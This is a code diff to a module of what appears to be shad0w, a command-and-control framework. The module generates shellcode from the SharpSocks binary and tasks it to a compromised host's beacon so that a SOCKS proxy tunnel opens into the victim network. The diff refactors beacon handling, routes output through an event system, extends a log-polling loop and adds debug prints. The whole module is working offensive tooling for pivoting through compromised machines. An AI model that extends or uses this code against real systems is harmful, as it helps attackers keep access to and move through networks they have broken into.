@@ -25,6 +25,9 @@ error_list = ""
 # location of sharpsocks binary
 sharpsocks_BIN = "/root/shad0w/bin/SharpSocks.x86.exe"
 
+# beacon to exec command on
+current_beacon = None
+
 # let argparse error and exit nice
 def error(message):
     global ERROR, error_list
@@ -37,7 +40,7 @@ def exit(status=0, message=None):
 
 def sharpsocks_callback(shad0w, data):
     if shad0w.sharpsocks_verbose:
-        print(data)
+        shad0w.event.beacon_info(current_beacon, data)
 
     return ""
 
@@ -59,22 +62,23 @@ def start_sharpsocks_server(http_listen=None, socks_listen=None, quick=True, cmd
     # start the server
     cmd = f"./{bin_name} {cmd_line} > /tmp/sharpsocks.log"
 
-    os.popen(cmd)
-
     try:
         os.unlink("/tmp/sharpsocks.log")
     except: pass
 
+    os.popen(cmd)
 
     data = ""
-    for _ in range(0, 5):
+    for _ in range(0, 10):
         try:
             with open("/tmp/sharpsocks.log", "r") as file:
                 data = file.read()
-        except:
+        except Exception as e:
+            print(e)
             time.sleep(0.5)
 
     if len(data) == 0:
+        print("DATA IS NONE")
         return None
 
     if quick == False:
@@ -98,19 +102,17 @@ def await_for_socks_start(shad0w):
             with open("/tmp/sharpsocks.log", "r") as file:
                 data = file.read()
             if "Socks proxy listening started" in data:
-                client_ip = shad0w.beacons[shad0w.current_beacon]["ip_addr"]
-                shad0w.debug.good(f"Socks started ({shad0w.endpoint}:43334 <==> {client_ip})")
+                client_ip = shad0w.beacons[current_beacon]["ip_addr"]
+                shad0w.event.beacon_info(current_beacon, f"Socks started ({shad0w.endpoint}:43334 <==> {client_ip})")
                 break
         except FileNotFoundError: pass
     return
 
-def main(shad0w, args):
-    global EXEC_SHARPSOCKS
+def main(shad0w, args, beacon):
+    global EXEC_SHARPSOCKS, current_beacon
 
-    # check we actually have a beacon
-    if shad0w.current_beacon is None:
-        shad0w.debug.log("ERROR: No active beacon", log=True)
-        return
+    # make beacon global
+    current_beacon = beacon
 
     # save the raw args
     raw_args = args
@@ -163,7 +165,7 @@ sharpsocks client -s http://your.redirector:port/ -k key
         http_listen_addr = f"*:8080"
         key = start_sharpsocks_server(http_listen=http_listen_addr)
         if key == None:
-            print("Failed to start server")
+            shad0w.event.beacon_info(current_beacon, "Failed to start server")
             return
 
         threading.Thread(target=await_for_socks_start, args=(shad0w,)).start()
@@ -190,5 +192,8 @@ sharpsocks client -s http://your.redirector:port/ -k key
 
         b64_comp_data = shellcode.generate(sharpsocks_BIN, args, args.param)
 
-        shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
-        shad0w.beacons[shad0w.current_beacon]["callback"] = sharpsocks_callback
+        # dont clear the callbacks, cause the responses are chunked
+        shad0w.clear_callbacks = False
+
+        shad0w.beacons[current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
+        shad0w.beacons[current_beacon]["callback"] = sharpsocks_callback
